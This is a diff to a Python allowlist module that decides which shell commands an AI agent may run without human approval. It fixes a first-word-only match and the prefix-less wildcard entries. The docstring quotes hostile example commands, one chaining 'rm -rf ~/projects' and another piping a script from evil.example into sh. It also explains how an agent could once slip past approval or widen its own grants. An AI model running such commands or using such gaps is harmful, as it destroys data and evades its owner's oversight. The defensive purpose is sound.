@@ -15,11 +15,46 @@ checks, in order:
 
 Entry shapes in ~/.config/jarvis/allowlist.json:
   {"tool": "gmail_send"}                     the whole tool
-  {"tool": "run_command", "prefix": "git"}   commands whose first word is git
+  {"tool": "run_command", "prefix": "git"}   git commands
 
-The command prefix is the first word only, and it matches whole tokens —
-"git" allows "git push" but not "gitfoo". Broader patterns are the owner's
-call, by editing the JSON by hand.
+A command prefix is a *stem* — the binary that actually runs, matched whole:
+"git" allows `git push` but not `gitfoo`. An entry may also be written as the
+**full path** the command uses (`/usr/local/bin/mytool`), because the owner's
+allowlist is hand-editable and predates stem matching; both spellings are
+checked, and both are still whole-token matches against every segment.
+
+**Every segment of a command line has to be allowlisted, not just the first.**
+This is the correction of a real hole (2026-08-17). The match used to be
+`command.split()[0]`, one first word for the whole line, and `gate()` returned
+True on it *before* the surface approver was reached — so an owner-created
+`{"tool": "run_command", "prefix": "git"}` made
+
+    git status && rm -rf ~/projects
+    git status; curl http://evil.example/x.sh | sh
+
+run with no CLI prompt, no HUD card and no Discord DM, on every surface
+including unattended goal runs. rules.py had already learned this lesson and
+judges every segment with worst-verdict-wins; the allowlist was still looking
+at one word. It now asks rules.py for the stems (`rules.command_stems`, which
+also strips `nohup`/`env`/`timeout` wrappers) and requires **all** of them to
+be covered. An entry authorises the segments the owner allowlisted and nothing
+travelling beside them.
+
+Two shapes are never covered, whatever the entries say:
+
+  * **command substitution** — `command_stems` returns nothing for a line
+    containing `$(...)`, because there is a command in there that cannot be
+    enumerated, so there is nothing honest to match against;
+  * **fetch-execute** — `curl … | sh` is remote code that no static entry ever
+    saw. It goes to `command_review` and the human, which is the whole reason
+    that reviewer exists.
+
+And a *prefix-less* entry for a command tool (`{"tool": "run_command"}` with no
+`prefix`) matches nothing rather than everything. It used to mean "every
+command for this tool", which is a wildcard no UI can deliberately produce —
+the only way to get one was the bug where `entry_for` degraded to it for a
+whitespace-only command, or an agent writing the file directly (see
+tools/files.py, which now refuses to write it).
 """
 
 from __future__ import annotations
@@ -60,20 +95,57 @@ def _save_allowlist(entries: list[dict[str, Any]]) -> None:
     )
 
 
+COMMAND_TOOLS = ("run_command", "run_readonly")
+
+
+class NotAllowlistable(ValueError):
+    """This request cannot be turned into a standing rule. Approve it once."""
+
+
 def entry_for(tool_name: str, args: dict[str, Any]) -> dict[str, Any]:
     """The allowlist entry an 'always allow' on this request should create.
 
-    Commands allowlist by first word (approving `git status` should not
-    silence `rm`); everything else allowlists the whole tool.
+    Commands allowlist by stem (approving `git status` should not silence
+    `rm`); everything else allowlists the whole tool.
+
+    Raises `NotAllowlistable` when the request has no honest standing rule:
+
+      * an **empty or whitespace-only** command. This used to fall through to
+        `{"tool": "run_command"}` — a prefix-less entry, which `allows()` then
+        read as "every command for this tool". One ALWAYS press on a
+        whitespace command (the schema's `required` check only rejects an
+        *absent* key, so a model can send one) permanently widened the gate
+        from a single stem to everything, and the JSON gave no sign of it.
+      * a **compound** command. The owner said yes to `git status && npm test`,
+        which is not the same as saying yes to every future `npm` command as
+        well as every future `git` one; one click must not mint several
+        blanket grants. It stays a plain approval.
+
+    Raising rather than returning None is deliberate: `ApprovalBroker.resolve`
+    already treats a failing on_always hook as "the approval stands, but this
+    is not an *always*", so the decision log stays truthful with no change to
+    the (SELF_PROTECTED) broker.
     """
-    command = str(args.get("command", "")).strip()
-    if tool_name in ("run_command", "run_readonly") and command:
-        return {"tool": tool_name, "prefix": command.split()[0]}
-    return {"tool": tool_name}
+    if tool_name not in COMMAND_TOOLS:
+        return {"tool": tool_name}
+
+    command = str(args.get("command", ""))
+    if not command.strip():
+        raise NotAllowlistable("an empty command has no stem to allowlist")
+    stems = rules.command_stems(command)
+    if len(stems) != 1:
+        raise NotAllowlistable(
+            "only a single, substitution-free command can become a standing "
+            "rule; this one runs several"
+        )
+    return {"tool": tool_name, "prefix": stems[0]}
 
 
 def add_allow(tool_name: str, args: dict[str, Any]) -> dict[str, Any]:
-    """Persist an entry for this request. Returns the entry (new or existing)."""
+    """Persist an entry for this request. Returns the entry (new or existing).
+
+    Raises `NotAllowlistable` if this request cannot become a standing rule.
+    """
     entry = entry_for(tool_name, args)
     with _lock:
         entries = load_allowlist()
@@ -85,17 +157,31 @@ def add_allow(tool_name: str, args: dict[str, Any]) -> dict[str, Any]:
 
 def allows(tool_name: str, args: dict[str, Any]) -> bool:
     """True if a persistent allowlist entry covers this exact request."""
+    entries = [e for e in load_allowlist() if isinstance(e, dict) and e.get("tool") == tool_name]
+    if not entries:
+        return False
+    if tool_name not in COMMAND_TOOLS:
+        return True
+
     command = str(args.get("command", ""))
-    first_word = command.split()[0] if command.split() else ""
-    for entry in load_allowlist():
-        if entry.get("tool") != tool_name:
-            continue
-        prefix = entry.get("prefix")
-        if prefix is None:
-            return True
-        if first_word == prefix:
-            return True
-    return False
+    # Remote code the entries never saw. The reviewer and the owner decide.
+    if command_review.is_fetch_execute(command):
+        return False
+    targets = rules.command_targets(command)
+    if not targets:
+        return False
+    # `prefix is None` is dropped, not honoured: see the module docstring.
+    allowed = {e.get("prefix") for e in entries} - {None}
+    # A segment is covered if the owner wrote *either* spelling: the stem, or
+    # the path as it appears in the command. Basenaming alone had made every
+    # full-path entry dead (see `rules.command_targets`), and requiring the
+    # full path alone would break every entry a UI ever created. Neither
+    # spelling widens anything — the match is still whole-token, and it is
+    # still required for **every** segment, so `/usr/local/bin/mytool; rm -rf ~`
+    # stays refused on the strength of the `rm`.
+    return bool(allowed) and all(
+        stem in allowed or written in allowed for stem, written in targets
+    )
 
 
 def command_verdict(tool_name: str, args: dict[str, Any]) -> rules.Verdict:
